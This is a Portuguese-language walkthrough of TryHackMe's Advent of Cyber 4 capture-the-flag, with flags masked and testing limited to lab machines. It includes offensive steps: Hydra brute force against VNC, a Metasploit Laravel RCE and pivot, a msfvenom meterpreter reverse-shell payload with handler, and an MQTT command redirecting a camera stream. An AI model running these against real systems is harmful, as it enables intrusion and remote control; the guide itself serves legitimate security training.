# Guia de resolução: Advent of Cyber 4 (2022)

> Este guia mostra como chegar às respostas sem publicar as flags. [Abra a sala no TryHackMe](https://tryhackme.com/room/adventofcyber4). Execute os testes apenas nas máquinas da sala. Os IPs mudam a cada inicialização.

## Preparação

Use uma máquina Linux própria conectada à VPN ou a AttackBox do TryHackMe. A máquina própria é recomendada para preservar histórico, arquivos e ferramentas entre sessões; veja as [opções de máquina de ataque](../../../README.md#máquina-local-conectada-à-vpn). Inicie a **Lab Machine** do dia e use o IP exibido pela sala. Algumas VMs gráficas têm acesso próprio pelo painel da tarefa e dispensam uma máquina de ataque separada.

```bash
export IP=<IP_DA_LAB_MACHINE>
ip route get "$IP"
nmap -Pn -sT --open -p 22,80,139,443,445,1883,5900,8080 "$IP"
```

Em **No answer needed**, conclua a leitura ou atividade e clique em **Check**. Nas linhas **Respostas**, `THM{...}` e `flag{...}` são máscaras de flags; `#` representa um algarismo e `...` oculta o restante. Não envie as máscaras à plataforma.

Para callbacks TCP ou RTSP com Kali em WSL2 e VPN no Windows, o [encaminhador TCP](scripts/vpn-wsl-relay.ps1) aceita IP da VPN, IP do WSL e porta como parâmetros. Use uma VM Linux conectada diretamente à VPN se o roteamento local já funcionar.

## Dia 1 - Frameworks

Abra o desafio interativo **Unified Kill Chain** e organize as etapas pela progressão do ataque: reconhecimento, preparação, obtenção de acesso, execução, controle e ação final. Faça as três rodadas do jogo; cada etapa aceita somente cartões que pertencem à fase indicada. Ao concluir, leia a identificação do adversário e a flag na tela final.

**Respostas:** `The...` (adversário); `THM{...}` (flag).

## Dia 2 - Análise de logs

Entre na VM por SSH com as credenciais apresentadas na tarefa. Liste os arquivos antes de analisar qualquer log. No log Web, procure a requisição da lista de Santa e anote IP de origem, código HTTP, data e dia da semana. No log SSH, procure a flag.

```bash
ssh elfmcblue@"$IP"
ls -lah
grep -n 'santaslist.txt' webserver.log
grep -oE 'THM\{[^}]+\}' SSHD.log
date -d '<DATA_DO_LOG>' +%A
```

Confira se a linha escolhida é a requisição `GET` do arquivo, pois outras entradas podem mencionar o mesmo caminho.

**Respostas:** `10...` (IP); `##` (código HTTP); `Fri...` (dia da semana); `THM{...}` (flag).

## Dia 3 - OSINT

Pesquise o histórico WHOIS do domínio informado na tarefa para obter o registrador no ano do evento. O registrador atual pode ser diferente. Depois procure o repositório público da loja de presentes indicado no enunciado. Leia seu `README.md`, siga a referência ao arquivo de configuração e compare os ambientes QA e PROD. Extraia a flag, o subdomínio de QA e a variável de senha do banco.

```bash
whois <DOMINIO_DA_TAREFA>
git clone <URL_DO_REPOSITORIO> /tmp/aoc4-osint
rg -n 'config\.php|THM|DB_|qa\.' /tmp/aoc4-osint
```

Não reutilize credenciais fora das máquinas do exercício.

**Respostas:** `NAM...` (registrador histórico); `{THM_...}` (flag); `qa....` (subdomínio); `DB_...` (variável); `S@...` (senha de teste).

## Dia 4 - Varredura e SMB

Varra a VM para identificar SSH, HTTP e SMB. Use a credencial de QA encontrada no dia 3 para listar os compartilhamentos. Entre no compartilhamento administrativo, baixe apenas os arquivos necessários e leia a flag e a lista de usuários. Use o usuário e a senha da lista para as perguntas seguintes.

```bash
nmap -Pn -sT -sV -p22,80,139,445 "$IP"
smbclient -L "//$IP" -U '<USUARIO_QA>'
smbclient "//$IP/<COMPARTILHAMENTO>" -U '<USUARIO_QA>'
# No prompt do smbclient:
# ls
# get flag.txt
# get userlist.txt
```

**Respostas:** `##` (porta SSH, se perguntada); `adm...` (compartilhamento); `{THM_...}` (flag); `san...` (usuário); `san...` (senha).

## Dia 5 - VNC e força bruta

Verifique se a VM expõe VNC na porta 5900. Use a lista de senhas da tarefa e Hydra com uma taxa moderada. Autentique no VNC com a senha encontrada. A flag aparece no papel de parede original; se a resolução do desktop a cortar, abra o arquivo de imagem salvo na VM em vez de confiar apenas na tela VNC.

```bash
nmap -Pn -sT -sV -p22,5900 "$IP"
hydra -P <LISTA_DA_TAREFA> -s 5900 -t 4 -f "$IP" vnc
vncviewer "$IP:5900"
```

Se a tarefa fornecer credenciais SSH para a mesma VM, é possível copiar `~/Pictures/Day 05 - Wallpaper.jpg` e inspecionar a imagem inteira.

**Respostas:** `1q...` (senha VNC); `THM{...}` (flag no papel de parede).

## Dia 6 - Cabeçalhos e anexo de e-mail

Na VM, execute `emlAnalyzer` sobre o e-mail fornecido. Compare `From`, `Reply-To`, nome exibido, cabeçalhos de spam, corpo HTML e anexos. Decodifique o `Message-ID` quando ele estiver em Base64. Calcule o SHA-256 do documento extraído. Para reputação e classificação, consulte os serviços sugeridos pela tarefa usando o endereço ou hash obtido.

```bash
emlAnalyzer -i 'Desktop/Urgent:.eml' --header --html -u --text --extract-all
printf '%s' '<MESSAGE_ID_BASE64>' | base64 -d
sha256sum '<ANEXO_EXTRAIDO>'
```

**Respostas:** `chi...` (remetente); `mur...` (retorno); `#` (pontuação); `AoC...` (ID decodificado); `082...` (SHA-256); `RIS...` (reputação); `Def...` (classificação); `mac...` (detecção).

## Dia 7 - CyberChef e macro

Inspecione o documento do dia anterior sem executá-lo. Extraia strings longas e localize o comando PowerShell com `-ENCOD`. O argumento codificado é Base64 de UTF-16LE. Decodifique em etapas e identifique os URLs e o nome do artefato. No CyberChef, reproduza a receita proposta pela sala para confirmar o resultado. Faça o defang do endereço antes de enviar ao campo que pede URL defanged.

```bash
strings -a -n 100 '<DOCUMENTO>' | rg -i 'ENCOD|powershell|http'
printf '%s' '<BASE64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Não execute o script decodificado. Leia e normalize concatenações, aspas e acentos graves apenas para reconstruir as strings.

**Respostas:** `mys...` (executável); `hxxps[://]...` (URL defanged); `THM_...` (identificador do ticket).

## Dia 8 - Reentrância em contrato inteligente

Baixe o ZIP oficial da tarefa e extraia `EtherStore.sol` e `Attack.sol`. No [Remix IDE](https://remix.ethereum.org/), importe e compile ambos usando uma versão de Solidity compatível com o cabeçalho dos arquivos. Escolha uma Remix VM local, implante `EtherStore` e faça um depósito de ETH **de teste**. Implante `Attack` passando o endereço do contrato `EtherStore`. Execute `attack()` com o valor de teste exigido pelo contrato e compare os saldos antes e depois. O console da transação mostra a flag quando a reentrância esvazia a loja.

O efeito decorre da ordem em `withdraw()`: a transferência externa ocorre antes de o saldo interno ser zerado. O contrato atacante recebe ETH, chama `withdraw()` de novo no callback e repete enquanto há saldo. Não use uma rede pública nem fundos reais.

**Respostas:** `flag{...}` (flag do console).

## Dia 9 - Pivoting em Laravel e Docker

Faça uma varredura curta e confirme a aplicação Web e a versão do framework por cabeçalhos, cookies e página de erro. No Metasploit, configure o módulo `exploit/multi/php/ignition_laravel_debug_rce` para o host da tarefa. Com a shell do contêiner, confirme `/.dockerenv` e examine a configuração da aplicação para achar o banco. Consulte a tabela de usuários, configure uma rota para o segmento interno visto na VM e autentique no host interno com as credenciais do próprio laboratório.

```text
use exploit/multi/php/ignition_laravel_debug_rce
set RHOSTS <IP_DA_LAB_MACHINE>
set RPORT 80
run
# Na sessão obtida:
cat /.dockerenv
cat /var/www/.env
```

Se a conexão reversa do Kali em WSL não alcançar diretamente o alvo, use uma VM Linux com VPN própria ou o encaminhamento pela interface VPN do Windows. O IP interno do contêiner pode mudar entre execuções.

**Respostas:** `Lar...` (framework); `pos...` (banco); `san...` (usuário); `p4...` (senha de teste); `THM{...}` (flag do host).

## Dia 10 - Memória de jogo com Cetus

Abra **Save Elf McSkidy** no desktop da VM gráfica. No Chrome da própria VM, abra DevTools e a aba **Cetus**. Se aparecer `Waiting for WASM`, recarregue o jogo com o DevTools aberto. Converse com o guarda e dê um palpite qualquer. A resposta dele revela o número atual. Faça uma busca `EQ`, tipo `i32`, por esse número e marque o endereço encontrado. Converse novamente com o guarda; o valor no bookmark muda. Converta o novo valor hexadecimal para decimal e use-o como palpite. A porta se abre e a flag do guarda aparece no diálogo.

```python
numero = int('<VALOR_HEXADECIMAL_DO_BOOKMARK>', 16)
print(numero)
```

Para a ponte do Yeti, faça uma busca inicial no Cetus com **Value vazio**, comparação **EQ** e tipo `i32`. Isso guarda os valores atuais para uma busca diferencial. Entre na ponte até perder parte da barra de vida e recue para uma área sem projéteis. No Cetus, mantenha **Value vazio**, selecione **LT** e pesquise novamente: restarão endereços cujo valor diminuiu. Receba outro impacto, recue e repita **LT** para reduzir a lista. Observe os valores candidatos enquanto a barra de vida muda e marque o endereço correspondente ao HP. Edite esse endereço para uma quantidade alta, como `9999`, e atravesse a ponte. Leia a flag no diálogo final do jogo.

**Respostas:** `THM{5_...}` (guarda); `THM{yet...}` (Yeti).

## Dia 11 - Memória forense com Volatility 3

Na VM, encontre `workstation.vmem` e use o Volatility 3. `windows.info` revela a versão principal do Windows. `windows.pslist` mostra o processo suspeito e seu PID. Passe o PID a `windows.dumpfiles` e conte os arquivos recuperados. O nome do processo pode aparecer truncado na lista; confira a pergunta da sala para saber se ela espera a extensão completa.

```bash
python3 vol.py -f workstation.vmem windows.info
python3 vol.py -f workstation.vmem windows.pslist
mkdir -p /tmp/aoc4-dump
python3 vol.py -f workstation.vmem -o /tmp/aoc4-dump windows.dumpfiles --pid <PID>
find /tmp/aoc4-dump -maxdepth 1 -type f | wc -l
```

**Respostas:** `##` (versão principal); `mys...` (processo); `####` (PID); `##` (arquivos).

## Dia 12 - Análise estática e dinâmica

Trabalhe na VM Windows isolada. Calcule o hash da amostra `mysterygift`, identifique o PE e verifique se há compactação UPX. Descompacte uma cópia para examinar strings e capacidades. Observe a persistência no registro após executar a amostra **somente na sandbox**. Compare os domínios e o caminho de download vistos nas strings com o tráfego e os artefatos criados.

```bash
sha256sum mysterygift
file mysterygift
upx -d -o mysterygift-unpacked mysterygift
strings -a mysterygift-unpacked | rg -i 'http|\.bat|\.jpg|run|startup'
```

**Respostas:** `0ce...` (SHA-256); `Nim...` (linguagem); `##` (técnicas); `tes...` (imagem); `wis...` (script); `bes...` (domínio); `HKCU...\Run` (persistência).

## Dia 13 - PCAP e tráfego do malware

Abra o PCAP da VM com TShark ou Wireshark. Conte os pacotes, examine a hierarquia de protocolos, ordene as conversas TCP e filtre DNS, HTTP e RDP. A requisição do executável e seu hash devem corresponder à amostra do dia 12. Exporte o objeto HTTP para calcular o hash. O `User-Agent` da consulta ao favicon ajuda a identificar a biblioteca HTTP.

```bash
capinfos '<CAPTURA>.pcapng'
tshark -r '<CAPTURA>.pcapng' -q -z io,phs
tshark -r '<CAPTURA>.pcapng' -q -z conv,tcp
tshark -r '<CAPTURA>.pcapng' -Y 'dns.qry.name || http.request' \
  -T fields -e ip.src -e dns.qry.name -e http.host -e http.request.uri -e http.user_agent
mkdir -p /tmp/aoc4-http
tshark -r '<CAPTURA>.pcapng' --export-objects http,/tmp/aoc4-http
sha256sum /tmp/aoc4-http/*
```

Consulte o histórico do hash no serviço de reputação indicado para os IPs relacionados, se essa pergunta estiver na sua versão da tarefa.

**Respostas:** `####` (pacotes); `#.#` (percentual HTTP); `####` (RDP); `bes...` e `cdn...` (DNS); `mys...` (download); `Nim...` (User-Agent); `0ce...` (SHA-256).

## Dia 14 - Aplicação Web e IDOR

Abra a aplicação e faça uma requisição normal pelo formulário. Observe a URL do perfil retornado e altere somente o identificador numérico. Percorra os IDs vizinhos até encontrar o perfil solicitado. O perfil revela o escritório e o padrão de nomes das imagens. Teste IDs de imagem próximos para localizar a mensagem escondida em uma imagem.

```bash
curl -i "http://$IP:8080/"
for id in 101 102 103 104 105 106 107; do
  curl -s "http://$IP:8080/users/$id.html" | rg -i 'name|office|images'
done
curl -o /tmp/aoc4-imagem.png "http://$IP:8080/images/<ID>.png"
```

**Respostas:** `Piv...` (nome); `###` (escritório); `THM{...}` (flag na imagem).

## Dia 15 - Upload de CV

Faça o upload de um PDF de teste para entender o formulário. Depois verifique o tratamento de um arquivo `.exe` inofensivo. A aplicação aceita a extensão e informa que um funcionário abrirá os CVs. Para demonstrar o risco no laboratório, gere um payload com `msfvenom`, inicie o listener do Metasploit, envie o arquivo pelo formulário com o token antifalsificação da sessão e aguarde o bot revisor. Leia a flag no diretório `Documents` da conta obtida na VM.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP_VPN_QUE_A_VM_ALCANCA> LPORT=<PORTA> -f exe -o /tmp/aoc4-cv.exe
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP_VPN>; set LPORT <PORTA>; run'
```

Na sessão, confirme o usuário antes de ler `C:\Users\<USUARIO>\Documents\flag.txt`. Para as perguntas de defesa, identifique validação de conteúdo, extensão e tamanho, renomeação dos uploads e análise de malware.

**Respostas:** `Unr...` (tipo de upload); `San...` (aplicação); `THM{...}` (flag); `Fil...` (controle de extensão); `Fil...` (renomeação); `Mal...` (varredura).

## Dia 16 - Correção de SQL injection

Entre no editor da VM com as credenciais laboratoriais fornecidas na tarefa e execute **Run Checks**. Corrija os dois usos do parâmetro `id` em `elf.php` com `intval($_GET['id'])`, salve e rode os testes. Em `search-toys.php`, substitua a concatenação de `q` por um prepared statement com dois placeholders. Em `toy.php`, trate os dois usos de `id` da mesma maneira. Em `login.php`, use um prepared statement para usuário e senha. Após cada correção, execute **Run Checks**, confirme que o fluxo normal continua funcionando e leia a nova flag no chat dos elfos.

```php
$q = "%" . $_GET['q'] . "%";
$stmt = mysqli_prepare($db, "select * from toys where name like ? or description like ?");
mysqli_stmt_bind_param($stmt, "ss", $q, $q);
mysqli_stmt_execute($stmt);
$toys_rs = mysqli_stmt_get_result($stmt);
```

**Respostas:** `THM{Mc...}` (primeira); `THM{Kod...}` (segunda); `THM{Are...}` (terceira); `THM{SQL...}` (quarta).

## Dia 17 - Expressões regulares

Copie o arquivo `strings` da pasta `RegExPractice` da VM e conte apenas correspondências completas. Para usuários, aplique um padrão alfanumérico com 6 a 12 caracteres; para e-mails, limite o domínio final a `.com` quando a pergunta pedir isso; para URLs, separe HTTP e HTTPS. Use `sort -u` quando a pergunta pedir domínios distintos, não ocorrências.

```bash
rg -o '\b[A-Za-z0-9]{6,12}\b' strings
rg -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.com\b' strings
rg -o 'https?://[^[:space:]]+' strings
```

Revise as bordas das expressões: uma correspondência dentro de uma string maior pode inflar o total.

**Respostas:** `#` (usuários); `Use...` (usuário específico); `##` (e-mails); `#` (domínios); `lew...`, `max...` e `hus...` (e-mails); `##` (URLs); `#` (HTTPS).

## Dia 18 - Sigma

No SigHunt da VM, crie regras para três comportamentos: criação de conta local, consulta de versão de software e criação de tarefa agendada. Escolha a categoria de log correta, use os Event IDs do Windows/Sysmon e combine os termos de linha de comando com `contains|all`. Execute cada regra, examine os eventos encontrados e recolha flag, usuário e hash onde pedidos.

```yaml
title: Account Creation
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4720
  condition: selection
```

Na regra de software, filtre `reg.exe` e os termos `reg`, `query` e `/v`; na tarefa agendada, filtre `schtasks.exe` com `/create` e `cmd.exe`. Use `Image|endswith` para o executável e Sysmon Event ID 1 para criação de processo.

**Respostas:** `THM{n0...}` (conta); `Ban...` (usuário); `THM{wh...}` (software); `SIG...` (conta da consulta); `THM{sch...}` (tarefa); `2F6...` (MD5).

## Dia 19 - Captura de sinais digitais

Abra o arquivo de captura `santa` no Logic 2 da VM **SaleaeLogicAnalyser**. Amplie a primeira região com transições regulares, identifique o canal que carrega os dados e adicione um analisador **Async Serial** a esse canal. Ajuste o baud rate conforme a largura dos bits e a lista de velocidades da tarefa. Verifique também polaridade, quantidade de bits, paridade e stop bit para que a saída vire texto legível. Selecione o trecho seguinte da captura e ajuste novamente o baud rate: a velocidade pode mudar entre mensagens. Leia o valor pedido no texto decodificado e copie a flag do fluxo serial, não dos valores brutos do gráfico.

**Respostas:** `####` (baud rate do segundo trecho); `THM{...}` (flag serial).

## Dia 20 - Firmware com Binwalk

Na VM de firmware, compare a entropia das versões. Extraia a imagem 1.0 com o script fornecido e use `unsquashfs` se o rootfs aparecer apenas como `rootfs.img`. Leia o segredo GPG no sistema de arquivos, importe as chaves da tarefa e decifre o firmware 2.2. Extraia também a versão nova, procure `flag.txt` e examine a versão do build em `lib/pkgconfig`.

```bash
binwalk -E -N firmwarev2.2*
./extract-firmware.sh firmwarev1.0*
unsquashfs -d fmk/rootfs fmk/image_parts/rootfs.img
cat fmk/rootfs/gpg/secret.txt
gpg --import <CHAVE_PRIVADA> <CHAVE_PUBLICA>
gpg -o firmwarev2.2.bin -d firmwarev2.2-encrypted.gpg
./extract-firmware.sh firmwarev2.2.bin
cat fmk/rootfs/flag.txt
find fmk/rootfs/lib/pkgconfig -type f
```

Ajuste nomes e caminhos ao layout produzido na sua VM; não sobrescreva a extração da versão 1.0 antes de recolher as chaves.

**Respostas:** `San...` (segredo GPG); `THM{...}` (flag); `roo...` (versão de build).

## Dia 21 - MQTT e câmera

Varra a porta MQTT, assine os tópicos disponíveis e procure a mensagem `device/init` com o identificador da câmera. No firmware extraído no dia 20, leia `pub_rtsp.py` para ver o formato do comando, o tópico de destino e a URL RTSP esperada. Inicie um servidor RTSP alcançável pela VM, publique o comando no tópico `device/<ID>/cmd` e capture um quadro do fluxo para ler a flag.

```bash
nmap -Pn -sT -sV -p1883 --script mqtt-subscribe "$IP"
mosquitto_sub -h "$IP" -t '#' -v
rg -n 'CMD|rtsp|device/.*/cmd' <DIRETORIO_FIRMWARE>
mosquitto_pub -h "$IP" -t "device/<ID>/cmd" \
  -m '{"CMD":10,"URL":"rtsp://<IP_VPN>:8554/<CAMINHO>"}'
ffmpeg -rtsp_transport tcp -i "rtsp://127.0.0.1:8554/<CAMINHO>" -frames:v 1 /tmp/aoc4-quadro.png
```

Se o Kali em WSL não receber conexões da VPN, encaminhe temporariamente a porta RTSP pela interface VPN do Windows e remova o encaminhamento depois.

**Respostas:** `####` (porta); `IKP...` (ID, variável por execução); `dev...` (tópico); `THM{...}` (flag no quadro).

## Dia 22 - Redução de superfície de ataque

No exercício interativo, arraste cada ameaça até o controle que a reduz: portas expostas com fechamento de portas, macros maliciosas com bloqueio de macros, dados expostos com remoção dos dados, phishing com proteção de e-mail, força bruta com senha forte e execução por USB com AppLocker. Confira se o contador mostra seis associações corretas, envie a atividade e leia a flag exibida. Marque também a pergunta sem resposta.

**Resposta:** `THM{4T...}` (flag).

## Dia 23 - Defesa em profundidade

Resolva os três cenários no jogo. No primeiro, converse com o guarda, obtenha acesso com a assistente, leia a gaveta e use a senha encontrada no cofre. No segundo, siga a pista da comida para entrar no laptop de Santa, leia `Vault.txt` e abra o cofre adicional. No terceiro, pegue o passe de Santa na gaveta, investigue a nota da assistente, desbloqueie o laptop, una as duas metades da senha do cofre e leia as duas flags. O código encontrado no cofre abre a oficina e revela a flag final.

Anote cada pista junto com o objeto que a fornece. Não é necessário adivinhar senhas de outros cenários: a ordem de dependências é gaveta, laptop, arquivo de texto, cofre e oficina.

**Respostas:** `S3c...` (senha do primeiro cofre); `THM{EZ...}` (primeira flag); `Mil...` (pista); `3Xt...` (segundo cofre); `THM{m0...}` (segunda flag); `Ban...` (nota); `H0t...` (laptop); `N3w...` (metade da senha); `####` (código da oficina); `THM{D3...}` (flag final).

## Dia 24 - Pesquisa e encerramento

Abra o formulário da pesquisa, responda às perguntas pessoais com suas próprias opiniões e avance por todas as páginas. Essas perguntas não têm resposta universal. Envie o formulário e copie a flag apresentada na tela final. Volte à sala para inserir essa flag e marque todos os campos **No answer needed** da tarefa de feedback. Na tarefa final, leia a história, responda à pergunta de encerramento e marque eventuais campos de leitura.

**Respostas:** `THM{AoC...}` (flag da pesquisa); `Ye...` (encerramento).
